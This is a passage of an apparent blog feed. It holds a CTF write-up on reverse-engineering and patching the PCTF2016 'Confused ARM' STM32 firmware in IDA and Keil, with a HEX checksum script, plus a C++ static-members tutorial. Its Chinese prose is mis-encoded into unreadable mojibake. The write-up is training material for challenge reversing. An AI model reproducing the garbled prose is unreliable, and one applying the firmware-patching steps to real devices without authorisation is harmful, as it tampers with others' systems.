    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç»“åˆä¹¦ã€ŠCTFç‰¹è®­è¥ã€‹IoTç¯‡çœ‹æœ€ä½³</p><h2 id="0x01-é™æ€åˆ†æ"><a href="#0x01-é™æ€åˆ†æ" class="headerlink" title="0x01 é™æ€åˆ†æ"></a>0x01 é™æ€åˆ†æ</h2><p>æŒ‡å®šå¤„ç†å™¨ç±»å‹ä¸ºARM little-endianï¼Œä¸ç„¶</p><img src="/2020/10/09/PCTF2016_Confused_ARM_%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201009103732001.png" class="" title="image-20201009103732001"><p>æ­£å¸¸æ‰“å¼€ä¹‹åå…ˆçœ‹çœ‹DCDéƒ¨åˆ†</p><blockquote><p>DCDï¼šæ•°æ®å®šä¹‰ï¼ˆ Data Definition ï¼‰ä¼ªæŒ‡ä»¤<br>ä¸€èˆ¬ç”¨äºä¸ºç‰¹å®šçš„æ•°æ®åˆ†é…å­˜å‚¨å•å…ƒï¼ŒåŒæ—¶å¯å®Œæˆå·²åˆ†é…å­˜å‚¨å•å…ƒçš„åˆå§‹åŒ–ã€‚</p><h3 id="è¯­æ³•æ ¼å¼ï¼š"><a href="#è¯­æ³•æ ¼å¼ï¼š" class="headerlink" title="è¯­æ³•æ ¼å¼ï¼š"></a>è¯­æ³•æ ¼å¼ï¼š</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">æ ‡å· <span class="hljs-meta">DCD</span>ï¼ˆæˆ– <span class="hljs-meta">DCDU</span>ï¼‰ è¡¨è¾¾å¼<br></code></pre></td></tr></table></figure><p>DCDï¼ˆæˆ– DCDUï¼‰ä¼ªæŒ‡ä»¤ç”¨äºåˆ†é…ä¸€ç‰‡è¿ç»­çš„å­—å­˜å‚¨å•å…ƒå¹¶ç”¨æŒ‡å®šçš„è¡¨è¾¾å¼åˆå§‹åŒ–ã€‚å…¶ä¸­è¡¨è¾¾å¼å¯ä»¥ä¸ºç¨‹åºæ ‡å·æˆ–æ•°å­—è¡¨è¾¾å¼ã€‚ DCD ä¹Ÿå¯ç”¨ â€œ &amp;â€ ä»£æ›¿ã€‚</p><p>ç”¨ DCD åˆ†é…çš„å­—å­˜å‚¨å•å…ƒæ˜¯å­—å¯¹é½çš„ï¼Œè€Œç”¨ DCDU åˆ†é…çš„å­—å­˜å‚¨å•å…ƒå¹¶ä¸ä¸¥æ ¼å­—å¯¹é½ã€‚</p><h3 id="å®ä¾‹ï¼ˆSTM32-å¯åŠ¨æ–‡ä»¶ï¼‰ï¼š"><a href="#å®ä¾‹ï¼ˆSTM32-å¯åŠ¨æ–‡ä»¶ï¼‰ï¼š" class="headerlink" title="å®ä¾‹ï¼ˆSTM32 å¯åŠ¨æ–‡ä»¶ï¼‰ï¼š"></a>å®ä¾‹ï¼ˆSTM32 å¯åŠ¨æ–‡ä»¶ï¼‰ï¼š</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">__Vectors       DCD     __initial_sp               <span class="hljs-comment">; Top of Stack</span><br>                DCD     Reset_Handler              <span class="hljs-comment">; Reset Handler</span><br>                DCD     NMI_Handler                <span class="hljs-comment">; NMI Handler</span><br>                DCD     HardFault_Handler          <span class="hljs-comment">; Hard Fault Handler</span><br>                DCD     MemManage_Handler          <span class="hljs-comment">; MPU Fault Handler</span><br>                DCD     <span class="hljs-keyword">BusFault_Handler </span>          <span class="hljs-comment">; Bus Fault Handler</span><br>                DCD     UsageFault_Handler         <span class="hljs-comment">; Usage Fault Handler</span><br>                DCD     <span class="hljs-number">0</span>                          <span class="hljs-comment">; Reserved</span><br>                DCD     <span class="hljs-number">0</span>                          <span class="hljs-comment">; Reserved</span><br>                DCD     <span class="hljs-number">0</span>                          <span class="hljs-comment">; Reserved</span><br>                DCD     <span class="hljs-number">0</span>                          <span class="hljs-comment">; Reserved</span><br>                DCD     SVC_Handler                <span class="hljs-comment">; SVCall Handler</span><br>                DCD     DebugMon_Handler           <span class="hljs-comment">; Debug Monitor Handler</span><br>                DCD     <span class="hljs-number">0</span>                          <span class="hljs-comment">; Reserved</span><br>                DCD     PendSV_Handler             <span class="hljs-comment">; PendSV Handler</span><br>                DCD     SysTick_Handler            <span class="hljs-comment">; SysTick Handler</span><br></code></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/GyForever1004/p/8893789.html">æ¥æº</a></p></blockquote><p>æ‰€ä»¥ç¬¬äºŒä¸ªå³ä¸ºReset handlerï¼Œå³<code>0x8000101</code></p><blockquote><p>The <strong>reset handler</strong> contains program code that is executed as soon as the processor exits from <strong>reset</strong>. In some cases, it contains some hardware initialization.</p></blockquote><p>å®é™…åœ°å€ä¸º<code>0x8000100</code></p><blockquote><p>These vectors have LSB set to 1 to indicate that the exceptions handlers are to be executed with Thumb instructions</p></blockquote><p>å¦ä¸€ç§åˆ¤æ–­æŒ‡ä»¤é›†ä¸ºthumbçš„æ–¹æ³•</p><blockquote><p><a href="https://eternalsakura13.com/2018/01/18/arm1/">æ¥æº</a></p><p>è¿™æœ‰ä¸€æ®µæŒ‡ä»¤ï¼Œåˆ¤æ–­å‡ºç›®å‰æ˜¯thumbæŒ‡ä»¤é›†çš„</p><p><a href="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/bDfa164Gm2.png?imageslim">![mark](PCTF2016ï¼šConfused ARM è°ƒè¯•è®°å½•/bDfa164Gm2.png)</a></p><p>ï¼ˆå›¾æ¥è‡ªsakuraåšå®¢ï¼Œä¸confused armæ— å…³ï¼‰</p><img src="/2020/10/09/PCTF2016_Confused_ARM_%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/L44GbeBb0g.png" class="" title="mark"><ul><li>Edit-&gt;segments-&gt;change segment register value(å¿«æ·é”®ALT+G)</li></ul></blockquote><p>æŒ‰ä¸‹ALT+Gï¼ŒTçš„value ä¸º0x0ï¼Œå°±æ˜¯æŒ‡å®šä¸ºARMæŒ‡ä»¤é›†ï¼Œè®¾å®šä¸º0x1ï¼Œå°±æ˜¯thumbæŒ‡ä»¤é›†</p><p>ç„¶ååœ¨<code>0x8000100</code>å¤„æŒ‰Cè½¬æ¢æˆcode</p><img src="/2020/10/09/PCTF2016_Confused_ARM_%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201009153839279.png" class="" title="image-20201009153839279"><p>ç„¶åæˆ‘ä»¬è·Ÿéš<code>0x8000100</code>è¿™ä¸ªç¨‹åºå…¥å£å¼€å§‹ï¼Œä¸€è·¯è·³è½¬åˆ°<code>0x8001084</code></p><img src="/2020/10/09/PCTF2016_Confused_ARM_%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201009154947339.png" class="" title="image-20201009154947339"><p>å¤šé€‰ç„¶åè½¬æ¢æˆhex</p><img src="/2020/10/09/PCTF2016_Confused_ARM_%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201009155719385.png" class="" title="image-20201009155719385"><p><code>0x40000000</code>å’Œ<code>0x20000000</code>ï¼Œå‰è€…æ˜¯ç‰¹æ®ŠåŠŸèƒ½å¯„å­˜å™¨çš„åŸºåœ°å€ï¼Œåè€…æ˜¯sramçš„èµ·å§‹åœ°å€</p><p>å°†è¿™äº›åœ°å€æ·»åŠ ä¸ºsegmentï¼Œåœ¨Edit-&gt;Segments-&gt;Create segemt </p><img src="/2020/10/09/PCTF2016_Confused_ARM_%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201009160159665.png" class="" title="image-20201009160159665"><p>SRAMéƒ¨åˆ†åŒä¸Šï¼Œ</p><p>ç„¶ååœ¨æ±‡ç¼–ä¸­å¯¹è¿™åœ°å€æŒ‰O</p><img src="/2020/10/09/PCTF2016_Confused_ARM_%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201009160319480.png" class="" title="image-20201009160319480"><img src="/2020/10/09/PCTF2016_Confused_ARM_%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201009160429796.png" class="" title="image-20201009160429796"><p>ç„¶ååœ¨ä¼ªä»£ç ä¸­å†æŒ‰ä¸€æ¬¡F5åˆ·æ–°</p><img src="/2020/10/09/PCTF2016_Confused_ARM_%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201009160509472.png" class="" title="image-20201009160509472"><p>éšååœ¨è¿™äº›ç–‘ä¼¼æ•°ç»„çš„åœ°æ–¹ç”¨å¦‚ä¸‹æ–¹å¼è¿›è¡Œè½¬æ¢</p><img src="/2020/10/09/PCTF2016_Confused_ARM_%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201009160758788.png" class="" title="image-20201009160758788"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall __noreturn <span class="hljs-title">sub_8001084</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// r0</span><br>  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// r0</span><br><br>  v1 = sub_8000A00(a1);<br>  v2 = sub_80006A4(v1);<br>  sub_80007F0(v2);<br>  sub_8000A50(<span class="hljs-number">0x1C200</span>);<br>  sub_8000AA8(&amp;USART1, <span class="hljs-number">0x40</span>);<br>  sub_8000560(byte_2000000C, &amp;unk_2000026C);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( unk_20000000 )<br>    &#123;<br>      sub_8000BA4(<br>        <span class="hljs-string">&quot;Key is :0x%08x,0x%08x,0x%08x,0x%08x\r\n&quot;</span>,<br>        byte_2000000C[<span class="hljs-number">0</span>],<br>        byte_2000000C[<span class="hljs-number">1</span>],<br>        byte_2000000C[<span class="hljs-number">2</span>],<br>        byte_2000000C[<span class="hljs-number">3</span>]);<br>      unk_20000000 = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( !sub_80007E2(<span class="hljs-number">1073809408</span>, <span class="hljs-number">2</span>) )<br>    &#123;<br>      sub_800055C(byte_2000000C, &amp;unk_2000026C);<br>      sub_8000248(&amp;unk_2000001C, byte_2000031C);<br>      sub_8000AA8(&amp;USART1, <span class="hljs-number">64</span>);<br>      sub_8000BA4(<br>        <span class="hljs-string">&quot;Fl4g 1s :PCTF&#123;%08x%08x%08x%08x&#125;\r\n&quot;</span>,<br>        byte_2000031C[<span class="hljs-number">0</span>],<br>        byte_2000031C[<span class="hljs-number">1</span>],<br>        byte_2000031C[<span class="hljs-number">2</span>],<br>        byte_2000031C[<span class="hljs-number">3</span>]);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x02-åŠ¨æ€è°ƒè¯•"><a href="#0x02-åŠ¨æ€è°ƒè¯•" class="headerlink" title="0x02 åŠ¨æ€è°ƒè¯•"></a>0x02 åŠ¨æ€è°ƒè¯•</h2><p>å‚è€ƒä¹¦459é¡µè¿›è¡Œé…ç½®</p><blockquote><p>å¦‚æœload hexä¹‹åæç¤ºno write permissionï¼Œè¯·æŒ‰ç…§462é¡µçš„å·¥ç¨‹è®¾ç½®ç•Œé¢ï¼Œå°†æœ€ä¸‹é¢çš„CPU DLL, Driver DLl, Dialog DLLå’ŒParameterå¯¹ç…§ä¸€è‡´è®¾ç½®å¥½å°±è¡Œ</p></blockquote><p>æŒ‰ç…§ä¹¦ä¸Šæ”¹åè¿‡å</p><img src="/2020/10/09/PCTF2016_Confused_ARM_%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201010091446144.png" class="" title="image-20201010091446144"><p>èµ„æ–™å¯å‚è€ƒ<a href="https://blog.csdn.net/weixin_40117614/article/details/93018940">è¿™å„¿</a></p><p>==æ‰“patchä¸º0C 4Aï¼Œæ”¹æˆ0B 4A ç†è§£ä¸èƒ½QwQï¼Œåé¢çš„æ‰“patchä¹Ÿç†è§£ä¸èƒ½QwQ==</p><p>æ”¹checksumï¼Œå¯ç”¨ä»¥ä¸‹è„šæœ¬è®¡ç®—ï¼Œ<a href="https://blog.csdn.net/qq_28840013/article/details/84143501">æ¥æº</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">DD</span>):</span><br>    length=<span class="hljs-built_in">len</span>(DD)  <span class="hljs-comment">#æ±‚é•¿åº¦</span><br><br>    <span class="hljs-comment">#åˆ›å»ºä¸€ä¸ªlistï¼Œå°†ä¼ å…¥çš„strçš„æ¯ä¸¤ä¸ªæ•°åˆåœ¨ä¸€èµ·ï¼Œå†æ±‚å’Œ</span><br>    list1=[]<br>    <span class="hljs-keyword">if</span>(length%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>):    <span class="hljs-comment">#å¦‚æœstré•¿åº¦ä¸ºå•æ•°ï¼Œåˆ™æŠ›å‡ºé”™è¯¯</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] æ•°æ®é•¿åº¦æœ‰è¯¯&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:   <br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, length, <span class="hljs-number">2</span>):  <span class="hljs-comment">#rangeï¼ˆå¼€å§‹ï¼Œç»“æŸ-1ï¼Œæ¯æ¬¡åŠ å¤šå°‘ï¼‰  è¿™é‡Œå³0â€”â€”length-1  æ¯æ¬¡å¾ªç¯i+2</span><br>            hex_digit=DD[i:i + <span class="hljs-number">2</span>]      <span class="hljs-comment">#å°†ä¼ å…¥çš„strçš„æ¯ä¸¤ä¸ªæ•°åˆåœ¨ä¸€èµ·</span><br>            list1.append(<span class="hljs-string">&#x27;0x&#x27;</span>+hex_digit)    <span class="hljs-comment">#å†æ¯ä¸ªå­—ç¬¦å‰+0x  ä½†æ˜¯å®ƒä»ç„¶æ˜¯å­—ç¬¦ï¼Œä½†æ›´ä¾¿äºä¸‹é¢é€šè¿‡int(list1[i], 16)è½¬æ¢æˆ16è¿›åˆ¶</span><br>    <span class="hljs-built_in">print</span>(list1)<br><br>    <span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(length/<span class="hljs-number">2</span>)):   <span class="hljs-comment">#æ±‚å’Œ</span><br>        <span class="hljs-built_in">sum</span>=<span class="hljs-built_in">int</span>(list1[i], <span class="hljs-number">16</span>)+<span class="hljs-built_in">sum</span>      <span class="hljs-comment">#int(list1[i], 16)å°†16è¿›åˆ¶è½¬æ¢æˆ10è¿›åˆ¶ intç±»å‹</span><br>    <span class="hljs-built_in">sum</span>=<span class="hljs-built_in">sum</span>%<span class="hljs-number">256</span><br>    <span class="hljs-built_in">sum</span>=<span class="hljs-number">256</span>-<span class="hljs-built_in">sum</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;æ ¡éªŒç : &#x27;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">sum</span>))   <span class="hljs-comment">#å°†sumå’Œç»“æœè½¬æ¢æˆ16è¿›åˆ¶  hex(sum)</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    DD=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥HEXæ–‡ä»¶æ•°æ®è®°å½•ï¼ˆæ ¡éªŒå€¼é™¤å¤–ï¼‰ï¼š&quot;</span>)   <span class="hljs-comment">#inputæ¥æ”¶å‚æ•°ä¸ºstrç±»å‹</span><br>    check(DD)<br></code></pre></td></tr></table></figure><p>ç„¶åMDKé‡Œreloadä¹‹åï¼Œrunå°±å¯ä»¥äº†</p><img src="/2020/10/09/PCTF2016_Confused_ARM_%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201010155940502.png" class="" title="image-20201010155940502">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>c++ staticçš„ä½œç”¨</title>
    <link href="/2020/09/23/c++%20static%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
    <url>/2020/09/23/c++%20static%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.tutorialspoint.com/cplusplus/cpp_static_members.htm#:~:text=By%20declaring%20a%20function%20member,the%20scope%20resolution%20operator%20%3A%3A.">åŸæ–‡</a></p><h2 id="static-menmbers-of-a-c-class"><a href="#static-menmbers-of-a-c-class" class="headerlink" title="static menmbers of a c++ class"></a>static menmbers of a c++ class</h2><p>å½“æˆ‘ä»¬å£°æ˜ä¸€ä¸ªç±»æˆå‘˜ä¸ºstaticçš„æ—¶å€™ï¼Œè¿™æ„å‘³ç€æ— è®ºæœ‰å…¶ä»–å¤šå°‘ç§ç±»çš„å¯¹è±¡è¢«åˆ›å»ºäº†ï¼Œä¹Ÿä»…æœ‰è¿™ä¸€ä»½é™æ€æˆå‘˜çš„copyã€‚</p><p>é™æ€æˆå‘˜ä¹Ÿè¢«ç±»çš„æ‰€æœ‰å¯¹è±¡å…±äº«ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++">Live Demo<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br> <br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Box</span> &#123;</span><br>   <span class="hljs-keyword">public</span>:<br>      <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> objectCount;<br>      <br>      <span class="hljs-comment">// Constructor definition</span><br>      <span class="hljs-built_in">Box</span>(<span class="hljs-keyword">double</span> l = <span class="hljs-number">2.0</span>, <span class="hljs-keyword">double</span> b = <span class="hljs-number">2.0</span>, <span class="hljs-keyword">double</span> h = <span class="hljs-number">2.0</span>) &#123;<br>         cout &lt;&lt;<span class="hljs-string">&quot;Constructor called.&quot;</span> &lt;&lt; endl;<br>         length = l;<br>         breadth = b;<br>         height = h;<br>         <br>         <span class="hljs-comment">// Increase every time object is created</span><br>         objectCount++;<br>      &#125;<br>      <span class="hljs-function"><span class="hljs-keyword">double</span> <span class="hljs-title">Volume</span><span class="hljs-params">()</span> </span>&#123;<br>         <span class="hljs-keyword">return</span> length * breadth * height;<br>      &#125;<br>      <br>   <span class="hljs-keyword">private</span>:<br>      <span class="hljs-keyword">double</span> length;     <span class="hljs-comment">// Length of a box</span><br>      <span class="hljs-keyword">double</span> breadth;    <span class="hljs-comment">// Breadth of a box</span><br>      <span class="hljs-keyword">double</span> height;     <span class="hljs-comment">// Height of a box</span><br>&#125;;<br><br><span class="hljs-comment">// Initialize static member of class Box</span><br><span class="hljs-keyword">int</span> Box::objectCount = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>   <span class="hljs-function">Box <span class="hljs-title">Box1</span><span class="hljs-params">(<span class="hljs-number">3.3</span>, <span class="hljs-number">1.2</span>, <span class="hljs-number">1.5</span>)</span></span>;    <span class="hljs-comment">// Declare box1</span><br>   <span class="hljs-function">Box <span class="hljs-title">Box2</span><span class="hljs-params">(<span class="hljs-number">8.5</span>, <span class="hljs-number">6.0</span>, <span class="hljs-number">2.0</span>)</span></span>;    <span class="hljs-comment">// Declare box2</span><br><br>   <span class="hljs-comment">// Print total number of objects.</span><br>   cout &lt;&lt; <span class="hljs-string">&quot;Total objects: &quot;</span> &lt;&lt; Box::objectCount &lt;&lt; endl;<br><br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">Constructor called.<br>Constructor called.<br>Total objects: <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h2 id="static-function-members"><a href="#static-function-members" class="headerlink" title="static function members"></a>static function members</h2><p>å£°æ˜ä¸€ä¸ªé™æ€æˆå‘˜å‡½æ•°ï¼Œè¿™å°†ä¼šè®©å®ƒç‹¬ç«‹äºç±»çš„æ‰€æœ‰å¯¹è±¡ã€‚</p><p>é™æ€æˆå‘˜å‡½æ•°åªèƒ½è®¿é—®é™æ€æ•°æ®æˆå‘˜ï¼Œå…¶ä»–é™æ€æˆå‘˜å‡½æ•°å’Œç±»å¤–æ‰€æœ‰å‡½æ•°ã€‚</p><blockquote><p>Static member functions have a class scope and they do not have access to the <strong>this</strong> pointer of the class. You could use a static member function to determine whether some objects of the class have been created or not.</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br> <br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Box</span> &#123;</span><br>   <span class="hljs-keyword">public</span>:<br>      <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> objectCount;<br>      <br>      <span class="hljs-comment">// Constructor definition</span><br>      <span class="hljs-built_in">Box</span>(<span class="hljs-keyword">double</span> l = <span class="hljs-number">2.0</span>, <span class="hljs-keyword">double</span> b = <span class="hljs-number">2.0</span>, <span class="hljs-keyword">double</span> h = <span class="hljs-number">2.0</span>) &#123;<br>         cout &lt;&lt;<span class="hljs-string">&quot;Constructor called.&quot;</span> &lt;&lt; endl;<br>         length = l;<br>         breadth = b;<br>         height = h;<br><br>         <span class="hljs-comment">// Increase every time object is created</span><br>         objectCount++;<br>      &#125;<br>      <span class="hljs-function"><span class="hljs-keyword">double</span> <span class="hljs-title">Volume</span><span class="hljs-params">()</span> </span>&#123;<br>         <span class="hljs-keyword">return</span> length * breadth * height;<br>      &#125;<br>      <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getCount</span><span class="hljs-params">()</span> </span>&#123;<br>         <span class="hljs-keyword">return</span> objectCount;<br>      &#125;<br>      <br>   <span class="hljs-keyword">private</span>:<br>      <span class="hljs-keyword">double</span> length;     <span class="hljs-comment">// Length of a box</span><br>      <span class="hljs-keyword">double</span> breadth;    <span class="hljs-comment">// Breadth of a box</span><br>      <span class="hljs-keyword">double</span> height;     <span class="hljs-comment">// Height of a box</span><br>&#125;;<br><br><span class="hljs-comment">// Initialize static member of class Box</span><br><span class="hljs-keyword">int</span> Box::objectCount = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>   <span class="hljs-comment">// Print total number of objects before creating object.</span><br>   cout &lt;&lt; <span class="hljs-string">&quot;Inital Stage Count: &quot;</span> &lt;&lt; Box::<span class="hljs-built_in">getCount</span>() &lt;&lt; endl;<br><br>   <span class="hljs-function">Box <span class="hljs-title">Box1</span><span class="hljs-params">(<span class="hljs-number">3.3</span>, <span class="hljs-number">1.2</span>, <span class="hljs-number">1.5</span>)</span></span>;    <span class="hljs-comment">// Declare box1</span><br>   <span class="hljs-function">Box <span class="hljs-title">Box2</span><span class="hljs-params">(<span class="hljs-number">8.5</span>, <span class="hljs-number">6.0</span>, <span class="hljs-number">2.0</span>)</span></span>;    <span class="hljs-comment">// Declare box2</span><br><br>   <span class="hljs-comment">// Print total number of objects after creating object.</span><br>   cout &lt;&lt; <span class="hljs-string">&quot;Final Stage Count: &quot;</span> &lt;&lt; Box::<span class="hljs-built_in">getCount</span>() &lt;&lt; endl;<br><br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs delphi">Inital Stage Count: <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">Constructor</span> <span class="hljs-title">called</span>.</span><br><span class="hljs-function"><span class="hljs-title">Constructor</span> <span class="hljs-title">called</span>.</span><br><span class="hljs-function"><span class="hljs-title">Final</span> <span class="hljs-title">Stage</span> <span class="hljs-title">Count</span>:</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç®€è¦ä»‹ç»ä¸€ä¸‹naså’Œè½¯è·¯ç”±</title>
    <link href="/2020/08/26/%E7%AE%80%E8%A6%81%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8Bnas%E5%92%8C%E8%BD%AF%E8%B7%AF%E7%94%B1/"/>
    <url>/2020/08/26/%E7%AE%80%E8%A6%81%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8Bnas%E5%92%8C%E8%BD%AF%E8%B7%AF%E7%94%B1/</url>
    
